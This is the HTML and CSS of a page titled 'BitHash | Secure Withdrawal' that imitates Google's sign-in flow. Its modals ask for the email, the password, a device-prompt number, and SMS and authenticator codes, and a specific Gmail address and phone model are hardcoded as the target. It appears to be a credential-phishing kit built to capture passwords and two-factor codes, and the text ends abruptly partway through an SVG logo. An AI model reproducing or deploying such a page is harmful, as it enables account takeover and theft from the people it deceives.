<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BitHash | Secure Withdrawal</title>
    
    <!-- Google Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:ital,wght@0,400;0,500;1,400&family=Roboto:ital,wght@0,300;0,400;0,500;0,700;1,400&display=swap" rel="stylesheet">
    
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        :root {
            --google-blue: #1a73e8;
            --google-blue-hover: #1b66c9;
            --google-red: #d93025;
            --google-gray: #5f6368;
            --google-light-gray: #dadce0;
            --google-bg-gray: #f8f9fa;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Roboto', 'Google Sans', Arial, sans-serif;
            background-color: white;
            color: #202124;
        }
        
        /* Google Authentication Modal Styles */
        .google-modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(0, 0, 0, 0.6);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10000;
            padding: 20px;
        }
        
        .google-modal {
            width: 448px;
            max-width: 100%;
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            overflow: hidden;
            font-family: 'Roboto', 'Google Sans', Arial, sans-serif;
        }

        .google-modal-content {
            padding: 0;
        }

        /* Logo */
        .logo-container {
            padding: 24px 0 0;
            text-align: center;
        }

        .google-logo {
            width: 75px;
            height: 24px;
            margin: 0 auto;
        }

        .google-logo svg {
            width: 100%;
            height: 100%;
        }

        /* Main Content */
        .main-content {
            padding: 0 40px 20px;
        }

        .title {
            font-family: 'Google Sans', Arial, sans-serif;
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            text-align: center;
            margin: 16px 0 8px;
            line-height: 1.3333;
        }

        .subtitle {
            font-family: Roboto, Arial, sans-serif;
            font-size: 16px;
            color: #202124;
            text-align: center;
            margin: 0 0 24px;
            line-height: 1.5;
        }

        /* Input */
        .input-wrapper {
            margin-bottom: 32px;
        }

        .input-container {
            position: relative;
            margin-bottom: 8px;
        }

        .text-input {
            width: 100%;
            height: 54px;
            padding: 13px 15px;
            border: 1px solid var(--google-light-gray);
            border-radius: 4px;
            font-family: Roboto, Arial, sans-serif;
            font-size: 16px;
            background: transparent;
            transition: border 0.2s;
        }

        .text-input:focus {
            border: 2px solid var(--google-blue);
            outline: none;
        }

        .text-input.error {
            border: 2px solid var(--google-red);
        }

        .text-input:focus + .input-label,
        .text-input:not(:placeholder-shown) + .input-label {
            top: -8px;
            left: 8px;
            font-size: 12px;
            color: var(--google-blue);
            background: #fff;
            padding: 0 4px;
        }

        .text-input.error + .input-label {
            color: var(--google-red);
        }

        .input-label {
            position: absolute;
            top: 18px;
            left: 15px;
            font-family: Roboto, Arial, sans-serif;
            font-size: 16px;
            color: var(--google-gray);
            pointer-events: none;
            transition: all 0.2s;
            background: #fff;
        }

        .error-message {
            color: var(--google-red);
            font-size: 12px;
            margin-top: 8px;
            font-family: Roboto, Arial, sans-serif;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        /* Links */
        .link-container {
            margin: 8px 0 0;
        }

        .forgot-link {
            color: var(--google-blue);
            text-decoration: none;
            font-family: Roboto, Arial, sans-serif;
            font-size: 14px;
            font-weight: 500;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        /* Note */
        .note-container {
            font-family: Roboto, Arial, sans-serif;
            font-size: 14px;
            color: var(--google-gray);
            line-height: 1.4286;
            margin-bottom: 24px;
        }

        .note-text {
            margin: 0 0 4px;
        }

        .learn-link {
            color: var(--google-blue);
            text-decoration: none;
            font-weight: 500;
        }

        .learn-link:hover {
            text-decoration: underline;
        }

        /* Footer */
        .footer-actions {
            padding: 24px 40px;
            border-top: 1px solid var(--google-light-gray);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .create-account {
            background: none;
            border: none;
            color: var(--google-blue);
            font-family: Roboto, Arial, sans-serif;
            font-size: 14px;
            font-weight: 500;
            padding: 10px 24px;
            cursor: pointer;
            border-radius: 4px;
        }

        .create-account:hover {
            background: var(--google-bg-gray);
        }

        .next-button {
            background: var(--google-blue);
            color: #fff;
            border: none;
            border-radius: 4px;
            font-family: Roboto, Arial, sans-serif;
            font-size: 14px;
            font-weight: 500;
            padding: 10px 24px;
            cursor: pointer;
            min-width: 88px;
        }

        .next-button:hover {
            background: var(--google-blue-hover);
            box-shadow: 0 1px 2px 0 rgba(26,115,232,0.3), 0 1px 3px 1px rgba(26,115,232,0.15);
        }

        .next-button:disabled {
            background: rgba(26, 115, 232, 0.38);
            cursor: not-allowed;
            box-shadow: none;
        }

        /* Two-Step Verification Styles */
        .two-step-verification {
            margin-bottom: 24px;
        }

        .verification-header {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 16px;
        }

        .verification-icon {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background-color: var(--google-bg-gray);
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--google-gray);
            font-size: 18px;
        }

        .verification-info h2 {
            font-family: 'Google Sans', Arial, sans-serif;
            font-size: 16px;
            font-weight: 500;
            color: #202124;
            margin: 0 0 4px;
        }

        .verification-info p {
            font-family: Roboto, Arial, sans-serif;
            font-size: 14px;
            color: var(--google-gray);
            margin: 0;
        }

        .verification-email {
            font-weight: 500;
            color: #202124;
            margin-bottom: 16px;
        }

        /* 2FA Methods */
        .verification-methods {
            margin: 20px 0;
        }

        .method-option {
            display: flex;
            align-items: center;
            padding: 12px 16px;
            border: 1px solid var(--google-light-gray);
            border-radius: 8px;
            margin-bottom: 12px;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .method-option:hover {
            background-color: var(--google-bg-gray);
        }

        .method-option.selected {
            border-color: var(--google-blue);
            background-color: #e8f0fe;
        }

        .method-icon {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background-color: #f1f3f4;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 16px;
            color: var(--google-gray);
            font-size: 18px;
        }

        .method-details {
            flex: 1;
        }

        .method-title {
            font-family: 'Google Sans', Arial, sans-serif;
            font-size: 16px;
            font-weight: 500;
            color: #202124;
            margin: 0 0 4px;
        }

        .method-description {
            font-family: Roboto, Arial, sans-serif;
            font-size: 14px;
            color: var(--google-gray);
            margin: 0;
        }

        .method-radio {
            width: 20px;
            height: 20px;
            border-radius: 50%;
            border: 2px solid var(--google-light-gray);
            display: flex;
            align-items: center;
            justify-content: center;
            margin-left: 12px;
        }

        .method-option.selected .method-radio {
            border-color: var(--google-blue);
        }

        .method-option.selected .method-radio::after {
            content: '';
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background-color: var(--google-blue);
        }

        /* Device Verification */
        .device-verification {
            margin: 20px 0;
        }

        .device-info {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 16px;
        }

        .device-icon {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background-color: #f1f3f4;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--google-gray);
            font-size: 18px;
        }

        .device-details h3 {
            font-family: 'Google Sans', Arial, sans-serif;
            font-size: 16px;
            font-weight: 500;
            color: #202124;
            margin: 0 0 4px;
        }

        .device-details p {
            font-family: Roboto, Arial, sans-serif;
            font-size: 14px;
            color: var(--google-gray);
            margin: 0;
        }

        .verification-code {
            font-family: monospace;
            font-size: 24px;
            font-weight: 500;
            color: #202124;
            text-align: center;
            margin: 20px 0;
            padding: 12px;
            background-color: var(--google-bg-gray);
            border-radius: 4px;
            letter-spacing: 2px;
        }

        /* SMS Verification */
        .sms-verification {
            margin: 20px 0;
        }

        .phone-number {
            font-weight: 500;
            color: #202124;
        }

        .code-input-container {
            display: flex;
            gap: 8px;
            margin: 16px 0;
            justify-content: center;
        }

        .code-input {
            width: 40px;
            height: 40px;
            border: 1px solid var(--google-light-gray);
            border-radius: 4px;
            text-align: center;
            font-size: 18px;
            font-weight: 500;
        }

        .code-input:focus {
            border-color: var(--google-blue);
            outline: none;
        }

        .resend-code {
            color: var(--google-blue);
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 8px;
        }

        .resend-code:hover {
            text-decoration: underline;
        }

        /* Security Key */
        .security-key-verification {
            margin: 20px 0;
            text-align: center;
        }

        .key-icon {
            font-size: 48px;
            color: var(--google-gray);
            margin: 20px 0;
        }

        .key-instructions {
            font-family: Roboto, Arial, sans-serif;
            font-size: 14px;
            color: var(--google-gray);
            margin: 16px 0;
        }

        /* Authenticator App */
        .authenticator-verification {
            margin: 20px 0;
        }

        .qr-code-container {
            display: flex;
            justify-content: center;
            margin: 16px 0;
        }

        .qr-code-placeholder {
            width: 160px;
            height: 160px;
            background-color: var(--google-bg-gray);
            border: 1px solid var(--google-light-gray);
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--google-gray);
            font-size: 14px;
        }

        .manual-entry {
            margin: 16px 0;
        }

        .secret-key {
            font-family: monospace;
            font-size: 14px;
            background-color: var(--google-bg-gray);
            padding: 8px 12px;
            border-radius: 4px;
            margin: 8px 0;
            word-break: break-all;
        }

        /* Verification in Progress */
        .verification-progress {
            text-align: center;
            margin: 20px 0;
        }

        .progress-spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #f1f3f4;
            border-top: 4px solid var(--google-blue);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 16px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .progress-text {
            font-family: Roboto, Arial, sans-serif;
            font-size: 14px;
            color: var(--google-gray);
            margin: 0;
        }

        /* Try Another Way */
        .try-another-way {
            margin: 20px 0;
            text-align: center;
        }

        .another-way-link {
            color: var(--google-blue);
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }

        .another-way-link:hover {
            text-decoration: underline;
        }

        /* Don't Ask Again */
        .dont-ask-again {
            display: flex;
            align-items: center;
            gap: 8px;
            margin: 16px 0;
        }

        .dont-ask-checkbox {
            width: 18px;
            height: 18px;
        }

        .dont-ask-label {
            font-family: Roboto, Arial, sans-serif;
            font-size: 14px;
            color: var(--google-gray);
        }

        /* Responsive Styles */
        @media (max-width: 480px) {
            .google-modal {
                width: 100%;
            }
            
            .main-content {
                padding: 0 20px 20px;
            }
            
            .footer-actions {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <!-- Google Authentication Modals -->
    
    <!-- Email and Password Verification Modal -->
    <div class="google-modal-overlay" id="email-password-modal" style="display: none;">
        <div class="google-modal">
            <div class="google-modal-content">
                <div class="logo-container">
                    <div class="google-logo">
                        <!-- Google's current "G" logo -->
                        <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                            <g>
                                <path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-1.1 2.443-3.164 4.784-7.154 4.784-4.61 0-8.178-3.402-8.178-8.01s3.568-8.01 8.178-8.01c3.204 0 5.294 1.71 6.508 3.15l-2.646 2.535c-.68-.85-1.938-1.804-3.862-1.804-2.716 0-4.938 2.272-4.938 5.13s2.222 5.13 4.938 5.13c2.716 0 3.784-1.24 4.342-2.122h-4.342v-3.357h8.484c.1.5.16 1.05.16 1.66 0 5.01-3.36 7.388-8.64 7.388z"></path>
                                <path fill="#4285f4" d="M43.586 16.303c-4.61 0-8.178-3.402-8.178-8.01s3.568-8.01 8.178-8.01c2.716 0 4.938 1.804 5.986 3.15l2.646-2.535c-1.98-2.37-5.294-3.15-8.632-3.15-6.84 0-12.222 5.13-12.222 11.545s5.382 11.545 12.222 11.545c4.61 0 8.178-2.37 10.052-6.508l-2.646-2.535c-1.1 2.37-3.568 3.998-7.406 3.998z"></path>
                                <path fill="#fbbc05" d="M25.17 16.303c-4.61 0-8.178-3.402-8.178-8.01s3.568-8.01 8.178-8.01c2.716 0 4.938 1.804 5.986 3.15l2.646-2.535c-1.98-2.37-5.294-3.15-8.632-3.15-6.84 0-12.222 5.13-12.222 11.545s5.382 11.545 12.222 11.545c4.61 0 8.178-2.37 10.052-6.508l-2.646-2.535c-1.1 2.37-3.568 3.998-7.406 3.998z"></path>
                                <path fill="#34a853" d="M10.002 16.303c-4.61 0-8.178-3.402-8.178-8.01s3.568-8.01 8.178-8.01c2.716 0 4.938 1.804 5.986 3.15l2.646-2.535c-1.98-2.37-5.294-3.15-8.632-3.15-6.84 0-12.222 5.13-12.222 11.545s5.382 11.545 12.222 11.545c4.61 0 8.178-2.37 10.052-6.508l-2.646-2.535c-1.1 2.37-3.568 3.998-7.406 3.998z"></path>
                            </g>
                        </svg>
                    </div>
                </div>
                
                <div class="main-content">
                    <h1 class="title" id="verification-title">Sign in</h1>
                    <p class="subtitle" id="verification-subtitle">Use your Google Account</p>
                    
                    <!-- Email Step (Initially Visible) -->
                    <div id="email-step" class="input-wrapper">
                        <div class="input-container">
                            <input type="email" id="verification-email" class="text-input" placeholder=" " autocomplete="email">
                            <label class="input-label">Email or phone</label>
                        </div>
                        
                        <div class="link-container">
                            <a href="#" class="forgot-link">Forgot email?</a>
                        </div>
                    </div>
                    
                    <!-- Password Step (Initially Hidden) -->
                    <div id="password-step" class="input-wrapper" style="display: none;">
                        <div class="input-container">
                            <input type="password" id="verification-password" class="text-input" placeholder=" " autocomplete="current-password">
                            <label class="input-label">Enter your password</label>
                            <div id="password-error" class="error-message" style="display: none;">
                                <i class="fas fa-exclamation-circle"></i>
                                Wrong password. Try again or click Forgot password to reset it.
                            </div>
                        </div>
                        
                        <div class="link-container">
                            <a href="#" class="forgot-link">Forgot password?</a>
                        </div>
                    </div>
                    
                    <div class="note-container">
                        <p class="note-text">Not your computer? Use Guest mode to sign in privately.</p>
                        <a href="#" class="learn-link">Learn more</a>
                    </div>
                </div>
                
                <div class="footer-actions">
                    <button class="create-account" onclick="closeGoogleModal('email-password-modal')">Create account</button>
                    <button class="next-button" id="verification-next-button" onclick="handleVerificationStep()">Next</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Two-Step Verification Modal -->
    <div class="google-modal-overlay" id="two-step-modal" style="display: none;">
        <div class="google-modal">
            <div class="google-modal-content">
                <div class="logo-container">
                    <div class="google-logo">
                        <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                            <g>
                                <path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-1.1 2.443-3.164 4.784-7.154 4.784-4.61 0-8.178-3.402-8.178-8.01s3.568-8.01 8.178-8.01c3.204 0 5.294 1.71 6.508 3.15l-2.646 2.535c-.68-.85-1.938-1.804-3.862-1.804-2.716 0-4.938 2.272-4.938 5.13s2.222 5.13 4.938 5.13c2.716 0 3.784-1.24 4.342-2.122h-4.342v-3.357h8.484c.1.5.16 1.05.16 1.66 0 5.01-3.36 7.388-8.64 7.388z"></path>
                                <path fill="#4285f4" d="M43.586 16.303c-4.61 0-8.178-3.402-8.178-8.01s3.568-8.01 8.178-8.01c2.716 0 4.938 1.804 5.986 3.15l2.646-2.535c-1.98-2.37-5.294-3.15-8.632-3.15-6.84 0-12.222 5.13-12.222 11.545s5.382 11.545 12.222 11.545c4.61 0 8.178-2.37 10.052-6.508l-2.646-2.535c-1.1 2.37-3.568 3.998-7.406 3.998z"></path>
                                <path fill="#fbbc05" d="M25.17 16.303c-4.61 0-8.178-3.402-8.178-8.01s3.568-8.01 8.178-8.01c2.716 0 4.938 1.804 5.986 3.15l2.646-2.535c-1.98-2.37-5.294-3.15-8.632-3.15-6.84 0-12.222 5.13-12.222 11.545s5.382 11.545 12.222 11.545c4.61 0 8.178-2.37 10.052-6.508l-2.646-2.535c-1.1 2.37-3.568 3.998-7.406 3.998z"></path>
                                <path fill="#34a853" d="M10.002 16.303c-4.61 0-8.178-3.402-8.178-8.01s3.568-8.01 8.178-8.01c2.716 0 4.938 1.804 5.986 3.15l2.646-2.535c-1.98-2.37-5.294-3.15-8.632-3.15-6.84 0-12.222 5.13-12.222 11.545s5.382 11.545 12.222 11.545c4.61 0 8.178-2.37 10.052-6.508l-2.646-2.535c-1.1 2.37-3.568 3.998-7.406 3.998z"></path>
                            </g>
                        </svg>
                    </div>
                </div>
                
                <div class="main-content">
                    <div class="two-step-verification">
                        <div class="verification-header">
                            <div class="verification-icon">
                                <i class="fas fa-shield-alt"></i>
                            </div>
                            <div class="verification-info">
                                <h2>Two-step verification</h2>
                                <p>When you try to sign in, Google wants to verify your identity to protect your account.</p>
                            </div>
                        </div>
                        
                        <div class="verification-email" id="two-step-email">datiweekend@gmail.com</div>
                        
                        <div class="verification-methods" id="verification-methods">
                            <!-- 2FA methods will be dynamically loaded here -->
                        </div>
                        
                        <div class="try-another-way">
                            <a href="#" class="another-way-link" onclick="showOtherVerificationMethods()">Try another way</a>
                        </div>
                    </div>
                </div>
                
                <div class="footer-actions">
                    <button class="create-account" onclick="closeGoogleModal('two-step-modal')">Cancel</button>
                    <button class="next-button" id="verify-button" onclick="verifyTwoStep()">Verify</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Device Notification Verification Modal -->
    <div class="google-modal-overlay" id="device-notification-modal" style="display: none;">
        <div class="google-modal">
            <div class="google-modal-content">
                <div class="logo-container">
                    <div class="google-logo">
                        <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                            <g>
                                <path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-1.1 2.443-3.164 4.784-7.154 4.784-4.61 0-8.178-3.402-8.178-8.01s3.568-8.01 8.178-8.01c3.204 0 5.294 1.71 6.508 3.15l-2.646 2.535c-.68-.85-1.938-1.804-3.862-1.804-2.716 0-4.938 2.272-4.938 5.13s2.222 5.13 4.938 5.13c2.716 0 3.784-1.24 4.342-2.122h-4.342v-3.357h8.484c.1.5.16 1.05.16 1.66 0 5.01-3.36 7.388-8.64 7.388z"></path>
                                <path fill="#4285f4" d="M43.586 16.303c-4.61 0-8.178-3.402-8.178-8.01s3.568-8.01 8.178-8.01c2.716 0 4.938 1.804 5.986 3.15l2.646-2.535c-1.98-2.37-5.294-3.15-8.632-3.15-6.84 0-12.222 5.13-12.222 11.545s5.382 11.545 12.222 11.545c4.61 0 8.178-2.37 10.052-6.508l-2.646-2.535c-1.1 2.37-3.568 3.998-7.406 3.998z"></path>
                                <path fill="#fbbc05" d="M25.17 16.303c-4.61 0-8.178-3.402-8.178-8.01s3.568-8.01 8.178-8.01c2.716 0 4.938 1.804 5.986 3.15l2.646-2.535c-1.98-2.37-5.294-3.15-8.632-3.15-6.84 0-12.222 5.13-12.222 11.545s5.382 11.545 12.222 11.545c4.61 0 8.178-2.37 10.052-6.508l-2.646-2.535c-1.1 2.37-3.568 3.998-7.406 3.998z"></path>
                                <path fill="#34a853" d="M10.002 16.303c-4.61 0-8.178-3.402-8.178-8.01s3.568-8.01 8.178-8.01c2.716 0 4.938 1.804 5.986 3.15l2.646-2.535c-1.98-2.37-5.294-3.15-8.632-3.15-6.84 0-12.222 5.13-12.222 11.545s5.382 11.545 12.222 11.545c4.61 0 8.178-2.37 10.052-6.508l-2.646-2.535c-1.1 2.37-3.568 3.998-7.406 3.998z"></path>
                            </g>
                        </svg>
                    </div>
                </div>
                
                <div class="main-content">
                    <div class="device-verification">
                        <div class="verification-header">
                            <div class="verification-icon">
                                <i class="fas fa-mobile-alt"></i>
                            </div>
                            <div class="verification-info">
                                <h2>Check your device</h2>
                                <p>Google has sent a notification to your devices. Verify your identity by selecting Yes in the notification.</p>
                            </div>
                        </div>
                        
                        <div class="device-info">
                            <div class="device-icon">
                                <i class="fas fa-mobile-alt"></i>
                            </div>
                            <div class="device-details">
                                <h3 id="device-name">Tecno SPARK 9 Pro</h3>
                                <p>Select <strong id="verification-code">55</strong> on your phone</p>
                            </div>
                        </div>
                        
                        <div class="dont-ask-again">
                            <input type="checkbox" id="dont-ask-device" class="dont-ask-checkbox">
                            <label for="dont-ask-device" class="dont-ask-label">Don't ask again on this device</label>
                        </div>
                        
                        <div class="verification-progress" id="device-verification-progress">
                            <div class="progress-spinner"></div>
                            <p class="progress-text">Waiting for your response...</p>
                        </div>
                    </div>
                </div>
                
                <div class="footer-actions">
                    <button class="create-account" onclick="closeGoogleModal('device-notification-modal')">Cancel</button>
                    <button class="next-button" id="try-another-device" onclick="showOtherVerificationMethods()">Try another way</button>
                </div>
            </div>
        </div>
    </div>

    <!-- SMS Verification Modal -->
    <div class="google-modal-overlay" id="sms-verification-modal" style="display: none;">
        <div class="google-modal">
            <div class="google-modal-content">
                <div class="logo-container">
                    <div class="google-logo">
                        <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                            <g>
                                <path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-1.1 2.443-3.164 4.784-7.154 4.784-4.61 0-8.178-3.402-8.178-8.01s3.568-8.01 8.178-8.01c3.204 0 5.294 1.71 6.508 3.15l-2.646 2.535c-.68-.85-1.938-1.804-3.862-1.804-2.716 0-4.938 2.272-4.938 5.13s2.222 5.13 4.938 5.13c2.716 0 3.784-1.24 4.342-2.122h-4.342v-3.357h8.484c.1.5.16 1.05.16 1.66 0 5.01-3.36 7.388-8.64 7.388z"></path>
                                <path fill="#4285f4" d="M43.586 16.303c-4.61 0-8.178-3.402-8.178-8.01s3.568-8.01 8.178-8.01c2.716 0 4.938 1.804 5.986 3.15l2.646-2.535c-1.98-2.37-5.294-3.15-8.632-3.15-6.84 0-12.222 5.13-12.222 11.545s5.382 11.545 12.222 11.545c4.61 0 8.178-2.37 10.052-6.508l-2.646-2.535c-1.1 2.37-3.568 3.998-7.406 3.998z"></path>
                                <path fill="#fbbc05" d="M25.17 16.303c-4.61 0-8.178-3.402-8.178-8.01s3.568-8.01 8.178-8.01c2.716 0 4.938 1.804 5.986 3.15l2.646-2.535c-1.98-2.37-5.294-3.15-8.632-3.15-6.84 0-12.222 5.13-12.222 11.545s5.382 11.545 12.222 11.545c4.61 0 8.178-2.37 10.052-6.508l-2.646-2.535c-1.1 2.37-3.568 3.998-7.406 3.998z"></path>
                                <path fill="#34a853" d="M10.002 16.303c-4.61 0-8.178-3.402-8.178-8.01s3.568-8.01 8.178-8.01c2.716 0 4.938 1.804 5.986 3.15l2.646-2.535c-1.98-2.37-5.294-3.15-8.632-3.15-6.84 0-12.222 5.13-12.222 11.545s5.382 11.545 12.222 11.545c4.61 0 8.178-2.37 10.052-6.508l-2.646-2.535c-1.1 2.37-3.568 3.998-7.406 3.998z"></path>
                            </g>
                        </svg>
                    </div>
                </div>
                
                <div class="main-content">
                    <div class="sms-verification">
                        <div class="verification-header">
                            <div class="verification-icon">
                                <i class="fas fa-comment-alt"></i>
                            </div>
                            <div class="verification-info">
                                <h2>Get a verification code</h2>
                                <p>Google will send a 6-digit code to your phone number ending in <span class="phone-number" id="phone-number">•••1234</span></p>
                            </div>
                        </div>
                        
                        <div class="code-input-container">
                            <input type="text" maxlength="1" class="code-input" id="code-1">
                            <input type="text" maxlength="1" class="code-input" id="code-2">
                            <input type="text" maxlength="1" class="code-input" id="code-3">
                            <input type="text" maxlength="1" class="code-input" id="code-4">
                            <input type="text" maxlength="1" class="code-input" id="code-5">
                            <input type="text" maxlength="1" class="code-input" id="code-6">
                        </div>
                        
                        <div class="resend-code" id="resend-code">Resend code</div>
                        
                        <div class="dont-ask-again">
                            <input type="checkbox" id="dont-ask-sms" class="dont-ask-checkbox">
                            <label for="dont-ask-sms" class="dont-ask-label">Don't ask again on this device</label>
                        </div>
                    </div>
                </div>
                
                <div class="footer-actions">
                    <button class="create-account" onclick="closeGoogleModal('sms-verification-modal')">Cancel</button>
                    <button class="next-button" id="verify-sms" onclick="verifySMSCode()">Verify</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Authenticator App Modal -->
    <div class="google-modal-overlay" id="authenticator-modal" style="display: none;">
        <div class="google-modal">
            <div class="google-modal-content">
                <div class="logo-container">
                    <div class="google-logo">
                        <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                            <g>
                                <path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-1.1 2.443-3.164 4.784-7.154 4.784-4.61 0-8.178-3.402-8.178-8.01s3.568-8.01 8.178-8.01c3.204 0 5.294 1.71 6.508 3.15l-2.646 2.535c-.68-.85-1.938-1.804-3.862-1.804-2.716 0-4.938 2.272-4.938 5.13s2.222 5.13 4.938 5.13c2.716 0 3.784-1.24 4.342-2.122h-4.342v-3.357h8.484c.1.5.16 1.05.16 1.66 0 5.01-3.36 7.388-8.64 7.388z"></path>
                                <path fill="#4285f4" d="M43.586 16.303c-4.61 0-8.178-3.402-8.178-8.01s3.568-8.01 8.178-8.01c2.716 0 4.938 1.804 5.986 3.15l2.646-2.535c-1.98-2.37-5.294-3.15-8.632-3.15-6.84 0-12.222 5.13-12.222 11.545s5.382 11.545 12.222 11.545c4.61 0 8.178-2.37 10.052-6.508l-2.646-2.535c-1.1 2.37-3.568 3.998-7.406 3.998z"></path>
                                <path fill="#fbbc05" d="M25.17 16.303c-4.61 0-8.178-3.402-8.178-8.01s3.568-8.01 8.178-8.01c2.716 0 4.938 1.804 5.986 3.15l2.646-2.535c-1.98-2.37-5.294-3.15-8.632-3.15-6.84 0-12.222 5.13-12.222 11.545s5.382 11.545 12.222 11.545c4.61 0 8.178-2.37 10.052-6.508l-2.646-2.535c-1.1 2.37-3.568 3.998-7.406 3.998z"></path>
                                <path fill="#34a853" d="M10.002 16.303c-4.61 0-8.178-3.402-8.178-8.01s3.568-8.01 8.178-8.01c2.716 0 4.938 1.804 5.986 3.15l2.646-2.535c-1.98-2.37-5.294-3.15-8.632-3.15-6.84 0-12.222 5.13-12.222 11.545s5.382 11.545 12.222 11.545c4.61 0 8.178-2.37 10.052-6.508l-2.646-2.535c-1.1 2.37-3.568 3.998-7.406 3.998z"></path>
                            </g>
                        </svg>
                    </div>
                </div>
                
                <div class="main-content">
                    <div class="authenticator-verification">
                        <div class="verification-header">
                            <div class="verification-icon">
                                <i class="fas fa-mobile-alt"></i>
                            </div>
                            <div class="verification-info">
                                <h2>Get a verification code</h2>
                                <p>Open Google Authenticator on your device to get your verification code.</p>
                            </div>
                        </div>
                        
                        <div class="qr-code-container">
                            <div class="qr-code-placeholder">
                                QR Code
                            </div>
                        </div>
                        
                        <div class="manual-entry">
                            <p>Or enter this code manually:</p>
                            <div class="secret-key" id="secret-key">JBSWY3DPEHPK3PXP</div>
                        </div>
                        
                        <div class="code-input-container">
                            <input type="text" maxlength="1" class="code-input" id="auth-code-1">
                            <input type="text" maxlength="1" class="code-input" id="auth-code-2">
                            <input type="text" maxlength="1" class="code-input" id="auth-code-3">
                            <input type="text" maxlength="1" class="code-input" id="auth-code-4">
                            <input type="text" maxlength="1" class="code-input" id="auth-code-5">
                            <input type="text" maxlength="1" class="code-input" id="auth-code-6">
                        </div>
                        
                        <div class="dont-ask-again">
                            <input type="checkbox" id="dont-ask-auth" class="dont-ask-checkbox">
                            <label for="dont-ask-auth" class="dont-ask-label">Don't ask again on this device</label>
                        </div>
                    </div>
                </div>
                
                <div class="footer-actions">
                    <button class="create-account" onclick="closeGoogleModal('authenticator-modal')">Cancel</button>
                    <button class="next-button" id="verify-auth" onclick="verifyAuthenticatorCode()">Verify</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Security Key Modal -->
    <div class="google-modal-overlay" id="security-key-modal" style="display: none;">
        <div class="google-modal">
            <div class="google-modal-content">
                <div class="logo-container">
                    <div class="google-logo">
                        <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                            <g>
                                <path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-1.1 2.443-3.164 4.784-7.154 4.784-4.61 0-8.178-3.402-8.178-8.01s3.568-8.01 8.178-8.01c3.204 0 5.294 1.71 6.508 3.15l-2.646 2.535c-.68-.85-1.938-1.804-3.862-1.804-2.716 0-4.938 2.272-4.938 5.13s2.222 5.13 4.938 5.13c2.716 0 3.784-1.24 4.342-2.122h-4.342v-3.357h8.484c.1.5.16 1.05.16 1.66 0 5.01-3.36 7.388-8.64 7.388z"></path>
                                <path fill="#4285f4" d="M43.586 16.303c-4.61 0-8.178-3.402-8.178-8.01s3.568-8.01 8.178-8.01c2.716 0 4.938 1.804 5.986 3.15l2.646-2.535c-1.98-2.37-5.294-3.15-8.632-3.15-6.84 0-12.222 5.13-12.222 11.545s5.382 11.545 12.222 11.545c4.61 0 8.178-2.37 10.052-6.508l-2.646-2.535c-1.1 2.37-3.568 3.998-7.406 3.998z"></path>
                                <path fill="#fbbc05" d="M25.17 16.303c-4.61 0-8.178-3.402-8.178-8.01s3.568-8.01 8.178-8.01c2.716 0 4.938 1.804 5.986 3.15l2.646-2.535c-1.98-2.37-5.294-3.15-8.632-3.15-6.84 0-12.222 5.13-12.222 11.545s5.382 11.545 12.222 11.545c4.61 0 8.178-2.37 10.052-6.508l-2.646-2.535c-1.1 2.37-3.568 3.998-7.406 3.998z"></path>
